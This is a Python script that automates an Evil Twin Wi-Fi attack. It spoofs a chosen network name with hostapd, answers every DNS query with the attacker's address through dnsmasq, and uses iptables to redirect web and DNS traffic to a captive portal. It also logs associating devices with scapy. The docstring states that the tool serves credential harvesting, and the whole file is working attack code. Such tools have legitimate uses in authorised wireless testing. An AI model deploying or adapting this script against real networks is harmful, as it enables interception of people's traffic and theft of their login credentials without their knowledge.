"""
beacon_spoofer.py

This script is used to simulate an Evil Twin access point. It uses hostapd to create a fake AP,
dnsmasq to serve DHCP and DNS, and a Flask-based captive portal server to intercept HTTP traffic.
It is designed to spoof a real network and capture user interaction for analysis or credential harvesting.

Usage:
    sudo python3 beacon_spoofer.py <SSID> <interface> <bssid>
"""

import os
import sys
import signal
import time
import subprocess
from threading import Thread
from scapy.all import *

# Static IP for the fake AP's interface
CAPTIVE_IP = "192.168.24.1"

# === ARGUMENT CHECK ===
def usage():
    """Displays usage information and exits."""
    print("Usage: sudo python3 beacon_spoofer.py <SSID> <interface> <bssid>")
    sys.exit(1)

# Expect exactly 3 arguments: SSID, interface, BSSID
if len(sys.argv) != 4:
    usage()

ssid, iface, bssid = sys.argv[1], sys.argv[2], sys.argv[3]

# === CONFIG GENERATORS ===
def generate_dnsmasq_conf():
    """
    Generates a dnsmasq configuration file for DHCP and DNS spoofing.
    """
    conf = f"""
interface={iface}
dhcp-range=192.168.24.50,192.168.24.150,12h
dhcp-option=3,{CAPTIVE_IP}
dhcp-option=6,{CAPTIVE_IP}
address=/#/{CAPTIVE_IP}
log-queries
no-resolv
"""
    with open("dnsmasq.conf", "w") as f:
        f.write(conf.strip())
    print("[+] dnsmasq.conf generated.")

def generate_hostapd_conf():
    """
    Generates a hostapd configuration to create a fake access point.
    """
    conf = f"""
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=3
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    with open("hostapd.conf", "w") as f:
        f.write(conf.strip())
    print("[+] hostapd.conf generated.")

# === SYSTEM SETUP ===
def setup_interface_ip():
    """
    Assigns a static IP address to the interface running the fake AP.
    """
    os.system(f"ip link set {iface} up")
    os.system(f"ip addr add {CAPTIVE_IP}/24 dev {iface}")
    print(f"[+] Interface {iface} set to {CAPTIVE_IP}")

def setup_iptables():
    """
    Configures iptables to redirect HTTP and DNS traffic to the captive server.
    """
    os.system("iptables -t nat -F")
    os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.24.1:80")
    os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 192.168.24.1")
    os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")
    print("[+] iptables rules set")

# === START SERVICES ===
def start_hostapd():
    """
    Launches hostapd to broadcast the fake SSID.
    """
    print("[*] Starting hostapd...")
    return subprocess.Popen(["hostapd", "hostapd.conf"])

def start_flask_server():
    """
    Launches the Flask-based captive portal.
    """
    print("[*] Starting Flask captive portal...")
    return subprocess.Popen(["python3", "web_server/server.py"])

def start_dnsmasq():
    """
    Launches dnsmasq to assign IP addresses and spoof DNS.
    """
    print("[*] Starting dnsmasq...")
    return subprocess.Popen(["dnsmasq", "-C", "dnsmasq.conf", "-d"])

# === SPOOFING LOGIC ===
def sniff_associations():
    """
    Monitors for client associations to the fake AP.
    """
    seen = set()
    def handler(pkt):
        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype in [0, 2, 4, 11]:
            mac = pkt.addr2
            if mac and mac not in seen:
                seen.add(mac)
                print(f"[+] Device associated: {mac}")
    sniff(iface=iface, prn=handler, store=0)

# === CLEANUP ===
def cleanup(signum, frame):
    """
    Cleans up processes and restores system state when interrupted.
    """
    print("\n[!] Cleaning up...")
    os.system("iptables -t nat -F")
    os.system("pkill dnsmasq")
    os.system("pkill hostapd")
    os.system("rm -f /var/lib/misc/dnsmasq.leases")
    sys.exit(0)

# Register cleanup handlers for interrupt and termination
signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# === RUN SEQUENCE ===
generate_dnsmasq_conf()
generate_hostapd_conf()
time.sleep(1)  # Ensure files are written before launching services
hostapd_proc = start_hostapd()
time.sleep(2)  # Give hostapd time to initialize
setup_interface_ip()
setup_iptables()
flask_proc = start_flask_server()
dns_proc = start_dnsmasq()

# Keep the script running to maintain services
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    cleanup(None, None)